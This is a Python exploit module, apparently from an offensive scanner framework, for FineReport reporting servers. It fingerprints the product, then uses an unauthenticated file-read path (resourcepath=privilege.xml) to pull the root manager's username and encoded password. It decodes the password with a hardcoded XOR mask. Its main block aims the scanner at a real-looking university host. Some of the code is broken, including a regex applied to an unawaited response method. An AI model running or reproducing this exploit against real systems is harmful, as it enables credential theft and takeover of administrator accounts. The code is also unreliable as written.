# coding=utf-8
# @Author   : zpchcbd HG team
# @Blog     : https://www.cnblogs.com/zpchcbd/
# @Time     : 2021-09-08 0:30
import re

from colorama import Fore
from tqdm import tqdm

from exploit.web import BaseScript
from core.MyEnums import BugType, BugLevel
from core.request.asynchttp import *


class Script(BaseScript):
    name = 'FineReport'

    def __init__(self, target, session):
        super().__init__()
        # basic
        self.target = target
        self.bugType = BugType.READFILE
        self.bugLevel = BugLevel.HIGH
        self.bugNumber = ''
        self.bugRefer = ''
        # main
        self.detectList = ['/WebReport/ReportServer', '/seeyonreport/ReportServer', '/webroot/ReportServer', '/decision/login']
        self.execPathList = ['/WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml',
                             '/seeyonreport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml',
                             '/webroot/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml']
        # 进度条
        self.session = session
        # 相关信息
        self.info = ''

    async def detect(self):
        try:
            for detectPath in self.detectList:
                url = f'http://{self.target}{detectPath}' if self.target.startswith(
                    ('http:', 'https:')) is False else f'{self.target}{detectPath}'
                async with self.session.get(url=url, headers=self.headers, timeout=self.reqTimeout, verify_ssl=False) as response:
                    if response is not None:
                        text = await response.text()
                        await asyncio.sleep(2)
                        if 'FineReport--Web Reporting Tool' in text:
                            self.flag = True
                            tqdm.write(Fore.RED + '[{}] {}'.format('FineReport', url))
                            return {'name': 'FineReport 8/9 Finger', 'url': url, 'software': 'FineReport'}
                        if '/com/fr/web/ui/fineui.min.js' in text:
                            self.flag = True
                            tqdm.write(Fore.RED + '[{}] {}'.format('FineReport', url))
                            return {'name': 'FineReport 10 Finger', 'url': url, 'software': 'FineReport'}
        except TimeoutError:
            return None
        except Exception:
            return None

    async def exec(self):
        def decode_passwd(cipher):
            PASSWORD_MASK_ARRAY = [19, 78, 10, 15, 100, 213, 43, 23]  # 掩码
            Password = ""
            cipher = cipher[3:]  # 截断三位后
            for i in range(int(len(cipher) / 4)):
                c1 = int("0x" + cipher[i * 4:(i + 1) * 4], 16)
                c2 = c1 ^ PASSWORD_MASK_ARRAY[i % 8]
                Password = Password + chr(c2)
            return Password
        try:
            for execPath in self.execPathList:
                url = f'http://{self.target}{execPath}' if self.target.startswith(
                    ('http:', 'https:')) is False else f'{self.target}{execPath}'
                async with self.session.get(url=url, timeout=self.reqTimeout, verify_ssl=False) as response:
                    if response is not None:
                        text = await response.text()
                        if 'rootManagerPassword' in text:
                            cipher = re.findall(r'<![CDATA[(.*?)]]></rootManagerPassword>', response.text)
                            username = re.findall(r'<![CDATA[(.*?)]]></rootManagerName>', response.text)
                            password = decode_passwd(cipher[0])
                            tqdm.write(Fore.RED + '[{}] {} {} / {}'.format('FineReport ReadFile Unauth', url, username, password))
                            return {'name': 'FineReport ReadFile Unauth {} / {}'.format(username, password), 'url': url, 'software': 'FineReport'}
        except Exception:
            return None

    async def attack(self, semaphore, pbar):
        async with semaphore:
            a = await self.detect()
            if a is not None:
                self.vulList.append(a)
            if self.flag:
                b = await self.exec()
                if b is not None:
                    self.vulList.append(b)
        pbar.update(1)
        return self.vulList


if __name__ == '__main__':
    semaphore = asyncio.Semaphore(500)
    sc = Script('oa.zjhu.edu.cn', 1)
    l = asyncio.get_event_loop()
    l.run_until_complete(sc.attack(semaphore))
